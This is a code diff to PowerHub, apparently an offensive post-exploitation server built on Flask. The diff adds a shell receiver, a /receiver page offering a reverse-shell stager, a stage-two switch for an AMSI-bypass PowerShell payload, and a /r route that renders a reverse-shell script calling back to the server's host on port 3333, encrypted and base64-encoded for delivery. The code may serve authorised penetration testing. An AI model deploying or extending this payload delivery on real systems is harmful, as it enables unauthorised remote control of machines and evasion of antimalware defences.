@@ -9,6 +9,7 @@ from powerhub.tools import encrypt, compress, key
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
 from powerhub.obfuscation import symbol_name
+from powerhub.receiver import ShellReceiver
 from powerhub.args import args
 
 from datetime import datetime
@@ -18,6 +19,8 @@ import os
 
 app = Flask(__name__)
 app.secret_key = os.urandom(16)
+
+shell_receiver = ShellReceiver()
 
 need_proxy = True
 need_tlsv12 = (args.SSL_KEY is not None)
@@ -33,12 +36,26 @@ def index():
 @requires_auth
 def hub():
     context = {
-        "dl_str": stager_str(need_proxy, need_tlsv12),
+        "dl_str": stager_str(need_proxy=need_proxy,
+                             need_tlsv12=need_tlsv12),
         "modules": modules,
         "repositories": list(repositories.keys()),
         "SSL": args.SSL_KEY is not None,
     }
     return render_template("hub.html", **context)
+
+
+@app.route('/receiver')
+@requires_auth
+def receiver():
+    context = {
+        "dl_str": stager_str(flavor='reverse_shell',
+                             need_proxy=need_proxy,
+                             need_tlsv12=need_tlsv12),
+        "SSL": args.SSL_KEY is not None,
+        "shells": shell_receiver.shells,
+    }
+    return render_template("receiver.html", **context)
 
 
 @app.route('/clipboard')
@@ -135,6 +152,7 @@ def payload_0():
         "key": key,
         "strings": encrypted_strings,
         "symbol_name": symbol_name,
+        "stage2": 'r' if 'r' in request.args else '1',
     }
     result = render_template(
                     "amsi.ps1",
@@ -238,3 +256,19 @@ def debug():
     else:
         response = Response("not found")
     return response
+
+
+@app.route('/r', methods=["GET"])
+def reverse_shell():
+    """Spawn a reverse shell"""
+    context = {
+        "dl_cradle": stager_str().replace('$K', '$R'),
+        "IP": args.URI_HOST,
+        "PORT": "3333",
+    }
+    result = render_template(
+                    "reverse-shell.ps1",
+                    **context,
+    ).encode()
+    result = b64encode(encrypt(result, key))
+    return Response(result, content_type='text/plain; charset=utf-8')
